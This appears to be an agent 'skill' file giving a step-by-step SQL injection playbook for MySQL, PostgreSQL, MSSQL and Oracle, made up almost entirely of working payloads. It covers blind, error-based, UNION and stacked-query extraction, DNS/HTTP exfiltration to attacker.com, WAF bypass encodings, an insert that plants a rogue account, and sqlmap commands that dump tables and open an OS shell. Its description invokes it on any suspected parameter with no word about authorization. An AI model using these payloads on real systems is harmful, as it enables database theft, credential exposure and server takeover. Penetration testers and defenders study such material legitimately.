---
name: sqli-techniques
description: SQL injection exploitation techniques including blind, time-based, error-based, UNION, stacked queries, and out-of-band methods. Use when SQL injection is suspected or confirmed on any parameter. Covers MySQL, PostgreSQL, MSSQL, and Oracle. Includes sqlmap and ghauri usage.
---

# SQL Injection Techniques

## Detection
```bash
# Basic tests
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
" OR "1"="1"--
1' AND '1'='1
1' AND '1'='2

# Time-based detection
' AND SLEEP(5)--              # MySQL
' AND pg_sleep(5)--           # PostgreSQL
'; WAITFOR DELAY '0:0:5'--   # MSSQL
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--  # Oracle

# Use ghauri (fastest for detection)
ghauri -u "https://TARGET.COM/page?id=1" --batch --level 3 --risk 2

# Use sqlmap (most thorough)
sqlmap -u "https://TARGET.COM/page?id=1" --batch --level 3 --risk 2
```

## UNION-based Injection
```bash
# Step 1: Find column count
' ORDER BY 1-- -'
' ORDER BY 2-- -'
...
' ORDER BY 10-- -'  # Error = 9 columns

# Step 2: Find which columns are reflected
' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -'

# Step 3: Replace NULLs with data
' UNION SELECT NULL,username,password,NULL,NULL,NULL,NULL,NULL,NULL FROM users-- -'
' UNION SELECT NULL,table_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.tables-- -'
' UNION SELECT NULL,column_name,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM information_schema.columns WHERE table_name='users'-- -'
```

## Blind SQL Injection (Boolean-based)
```bash
# Step 1: Determine database name length
' AND (SELECT LENGTH(database()))=1-- -'  # false
' AND (SELECT LENGTH(database()))=8-- -'  # true → DB name is 8 chars

# Step 2: Extract database name character by character
' AND (SELECT SUBSTRING(database(),1,1))='a'-- -'
' AND (SELECT SUBSTRING(database(),1,1))='d'-- -'  # true → first char is 'd'

# Step 3: Extract table names
' AND (SELECT SUBSTRING(table_name,1,1) FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)='u'-- -'

# Automate with sqlmap
sqlmap -u "https://TARGET.COM/page?id=1" --batch --technique=B --dbms=mysql
```

## Time-based Blind Injection
```bash
# MySQL
' AND IF(1=1,SLEEP(5),0)-- -'  # 5 second delay = injection works
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)-- -'

# PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- -'

# MSSQL
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -'

# Oracle
' AND CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END FROM dual-- -'

# Automate
sqlmap -u "https://TARGET.COM/page?id=1" --batch --technique=T
ghauri -u "https://TARGET.COM/page?id=1" --batch --technique=T
```

## Error-based Injection
```bash
# MySQL (extractvalue)
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -'
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e))-- -'

# MySQL (updatexml)
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT database()),0x7e),1)-- -'

# PostgreSQL
' AND 1=CAST((SELECT version()) AS INT)-- -'

# MSSQL
' AND 1=CONVERT(INT,(SELECT @@version))-- -'

# Oracle
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))-- -'
```

## Stacked Queries
```bash
# MySQL
'; SELECT * FROM users WHERE id=1; SELECT * FROM information_schema.tables-- -'

# MSSQL (stacked queries supported by default)
'; SELECT * FROM users; SELECT * FROM information_schema.tables-- -'

# Use for data extraction when UNION doesn't work
# Use for INSERT/UPDATE/DELETE operations
'; INSERT INTO users (username,password) VALUES ('hacker','hacked')-- -'
```

## Out-of-band Injection
```bash
# MySQL (LOAD_FILE for DNS exfil)
' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.attacker.com\\share')))-- -'

# MSSQL (xp_cmdshell for DNS exfil)
'; EXEC master..xp_dirtree '\\attacker.com\share'-- -'

# Oracle (UTL_HTTP)
' AND 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))-- -'
```

## WAF Bypass for SQLi
```bash
# Double encoding
%2527 = %27 = '
%253B = %3B = ;

# Unicode
%c0%27 = '
%e0%80%27 = '

# Case variation
SeLeCt, InSeRt, UpDaTe

# Comment injection
UN/**/ION SEL/**/ECT 1,2,3
SEL/**/ECT/**/name/**/FROM/**/users

# Alternative syntax
' || '1'='1
' && '1'='1
' RLIKE '1'='1
' REGEXP '1'='1

# Newline bypass
%0aSELECT 1,2,3
```

## SQLMap Advanced Usage
```bash
# Test specific parameter
sqlmap -u "https://TARGET.COM/page?id=1" --batch -p id

# POST request
sqlmap -u "https://TARGET.COM/login" --batch --data="email=a@b.com&password=test"

# With cookies
sqlmap -u "https://TARGET.COM/page?id=1" --batch --cookie="session=abc123"

# With headers
sqlmap -u "https://TARGET.COM/page?id=1" --batch --headers="Authorization: Bearer TOKEN"

# Extract all databases
sqlmap -u "https://TARGET.COM/page?id=1" --batch --dbs

# Extract specific database
sqlmap -u "https://TARGET.COM/page?id=1" --batch -D dbname --tables

# Extract table data
sqlmap -u "https://TARGET.COM/page?id=1" --batch -D dbname -T users --dump

# OS shell (if file write possible)
sqlmap -u "https://TARGET.COM/page?id=1" --batch --os-shell
```
